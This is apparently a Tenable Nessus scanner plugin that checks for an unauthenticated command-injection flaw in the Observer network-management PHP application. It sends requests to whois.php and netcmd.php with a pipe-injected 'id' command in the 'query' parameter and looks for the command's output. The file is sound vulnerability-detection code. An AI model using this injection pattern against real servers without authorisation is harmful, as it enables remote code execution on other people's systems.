#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(34292);
  script_version("$Revision: 1.9 $");

  script_bugtraq_id(31381);

  script_xref(name:"EDB-ID", value:"6559");

  script_name(english:"Observer <= 0.3.2.1 Multiple Remote Command Execution Vulnerabilities");
  script_summary(english:"Tries to run a command using observer");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Observer, a web-based network management
system written in PHP. 

The version of Observer installed on the remote host fails to sanitize
input to the 'query' parameter of the 'whois.php' and 'netcmd.php'
scripts before using it in a commandline that is passed to the shell. 
Regardless of PHP's 'register_globals' setting is disabled, an
unauthenticated attacker can leverage these issues to execute
arbitrary code on the remote host subject to the privileges of the web
server user id." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/09/25");
 script_cvs_date("$Date: 2015/09/24 21:17:13 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";

if (thorough_tests) 
{
  exploits = make_list(
    string("/whois.php?query=|", urlencode(str:cmd)),
    string("/netcmd.php?cmd=whois&query=|", urlencode(str:cmd))
  );
}
else 
{
  exploits = make_list(
    string("/whois.php?query=|", urlencode(str:cmd))
  );
}


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/observer", cgi_dirs()));
else dirs = make_list(cgi_dirs());


info = "";
output = "";
foreach dir (dirs)
{
  # Try to exploit an issue.
  foreach exploit (exploits)
  {
    url = string(dir, exploit);

    w = http_send_recv3(method:"GET", item:url, port:port);
    if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
    res = w[2];

    # There's a problem if we see the command output.
    if (egrep(pattern:cmd_pat, string:res))
    {
      info += '  ' + build_url(port:port, qs:url) + '\n';

      if (!contents) output = res;
    }
    if (info && !thorough_tests) break;
  }
}


if (info)
{
  if (report_verbosity)
  {
    if (max_index(split(info)) > 1) s = "s";
    else s = "";

    report = string(
      "\n",
      "Nessus was able to execute the command '", cmd, "' on the remote \n",
      "host using the following URL", s, " :\n",
      "\n",
      info
    );
    if (report_verbosity > 1)
      if (stridx(output, "<pre>") == 0) output = substr(output, 5);
      if (stridx(output, "</pre>") == strlen(output)-6) output = substr(output, 0, strlen(output)-7);

      report = string(
        report,
        "\n",
        "It produced the following output :\n",
        "\n",
        "  ", output, "\n"
      );

    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
